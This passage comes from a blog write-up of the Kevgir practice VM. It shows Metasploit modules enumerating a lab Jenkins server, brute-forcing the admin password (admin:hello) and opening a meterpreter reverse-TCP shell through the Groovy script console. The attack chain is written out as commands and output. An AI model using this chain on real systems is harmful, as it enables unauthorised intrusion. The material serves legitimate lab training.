</span><span class='line'>Description:
</span><span class='line'>  This module enumerates a remote Jenkins-CI installation in an 
</span><span class='line'>  unauthenticated manner, including host operating system and Jenkins 
</span><span class='line'>  installation details.</span></code></pre></td></tr></table></div></figure>


<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; exploit
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.128:9000  - Jenkins Version 1.647
</span><span class='line'>[*] /script restricted (403)
</span><span class='line'>[*] /view/All/newJob restricted (403)
</span><span class='line'>[+] http://192.168.217.128:9000/ - /asynchPeople/ does not require authentication (200)
</span><span class='line'>[*] /systemInfo restricted (403)</span></code></pre></td></tr></table></div></figure>


<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>

<p><img class="center" src="/images/pentest/kevgir/jenkins-admin.jpg" title="jenkins admin" alt="jenkins admin"></p>

<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Module options (auxiliary/scanner/http/jenkins_login):
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                     Required  Description
</span><span class='line'>   ----              ---------------                                     --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
</span><span class='line'>   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
</span><span class='line'>   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
</span><span class='line'>   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
</span><span class='line'>   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
</span><span class='line'>   PASSWORD                                                              no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
</span><span class='line'>   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             9000                                                yes       The target port (TCP)
</span><span class='line'>   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
</span><span class='line'>   THREADS           1                                                   yes       The number of concurrent threads
</span><span class='line'>   USERNAME          admin                                               no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
</span><span class='line'>   USER_AS_PASS      false                                               no        Try the username as the password for all users
</span><span class='line'>   USER_FILE                                                             no        File containing usernames, one per line
</span><span class='line'>   VERBOSE           true                                                yes       Whether to print output for all attempts
</span><span class='line'>   VHOST                                                                 no        HTTP server virtual host</span></code></pre></td></tr></table></div></figure>


<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 192.168.217.128:9000 - Login Successful: admin:hello</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>

<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>

<p>Don&rsquo;t forget to select the target as Linux:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/jenkins_script_console):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   API_TOKEN                   no        The API token for the specified username
</span><span class='line'>   PASSWORD   hello            no        The password for the specified username
</span><span class='line'>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST      192.168.217.128  yes       The target address
</span><span class='line'>   RPORT      9000             yes       The target port (TCP)
</span><span class='line'>   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT    8080             yes       The local port to listen on.
</span><span class='line'>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   TARGETURI  /                yes       The path to the Jenkins-CI application
</span><span class='line'>   URIPATH                     no        The URI to use for this exploit (default is random)
</span><span class='line'>   USERNAME   admin            no        The username to authenticate as
</span><span class='line'>   VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (linux/x86/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.217.132  yes       The listen address
</span><span class='line'>   LPORT  8080             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   1   Linux</span></code></pre></td></tr></table></div></figure>


<p>And a new shell appears!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(jenkins_script_console) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.217.132:8080 
</span><span class='line'>[*] Checking access to the script console
</span><span class='line'>[*] Logging in...
</span><span class='line'>[*] 192.168.217.128:9000 - Sending Linux stager...
</span><span class='line'>[*] Sending stage (849108 bytes) to 192.168.217.128
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.217.132:8080 -&gt; 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500
</span><span class='line'>
</span><span class='line'>meterpreter &gt; 
</span><span class='line'>[!] Deleting /tmp/wE472W payload file</span></code></pre></td></tr></table></div></figure>


<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>46201/tcp open  unknown
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   DNSStatusRequest: 
</span><span class='line'>|     Unrecognized protocol:
</span><span class='line'>|   DNSVersionBindReq: 
</span><span class='line'>|     Unrecognized protocol: 
</span><span class='line'>|     version
</span><span class='line'>|_    bind
</span><span class='line'>53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span class='line'>SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
</span><span class='line'>SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
</span><span class='line'>SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
</span><span class='line'>SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");</span></code></pre></td></tr></table></div></figure>


<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>

<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
TCP/IP and UDP/IP via Java NIO.</p></blockquote>

<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>

<h3>Learn more</h3>

<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ This will be a memorable month -- no  \
</span><span class='line'>\ matter how hard you try to forget it. /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>

      








  


<time datetime="2017-12-02T14:08:05-05:00" pubdate data-updated="true">Dec 2<span>nd</span>, 2017</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2017/11/11/lfcs-prep-resetting-root-password-on-centos-7/" title="Previous Post: LFCS prep - Resetting root password on CentOS 7">&laquo; LFCS prep - Resetting root password on CentOS 7</a>
      
      
        <a class="basic-alignment right" href="/blog/2018/01/05/lfcs-prep-securing-ssh/" title="Next Post: LFCS prep - Securing SSH">LFCS prep - Securing SSH &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>whoami</h1>
  <p>switch (interests){<br>
 case INFORMATION SECURITY:<br>
Mostly offensive security, but trying to be well-rounded in everything;<br>
case PYTHON:<br>
Mainly security and sysadmin related scripting;<br>
case LINUX:<br>
Greetings from /dev/null;<br>
case JAPANESE:<br>
Language, anime, samurai;<br>
case MARTIAL ARTS:<br>
If it's fighting I like it;<br>
case MILITARY SCIENCE:<br>
Ancient, medieval, modern;<br>
default: GAMING;}</p>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2018/02/17/lfcs-prep-configure-an-smtp-mail-service/">LFCS prep - Configure an SMTP mail service</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/02/15/lfcs-prep-changing-kernel-parameters/">LFCS prep - Changing kernel parameters</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/02/14/lfcs-prep-ntp-configuration/">LFCS prep - NTP configuration</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/02/13/lfcs-prep-configuring-sgid-directories/">LFCS prep - Configuring SGID directories</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/02/12/lfcs-prep-managing-encrypted-partitions/">LFCS prep - Managing encrypted partitions</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating...</li>
  </ul>
  
  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
  
  <script type="text/javascript">
    $(document).ready(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'chousensha',
            count: 5,
            skip_forks: true,
	    skip_repos: [ "chousensha.github.io" ],
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>


<section>
  <h1>Latest Tweets</h1>
  <ul id="tweets">
    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
  </ul>
  
    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
  
</section>

<section>
  <h1>Blogroll</h1>
  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
</section>

  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2018 - chousensha -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'coredumpoverflow';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/';
        var disqus_url = 'http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
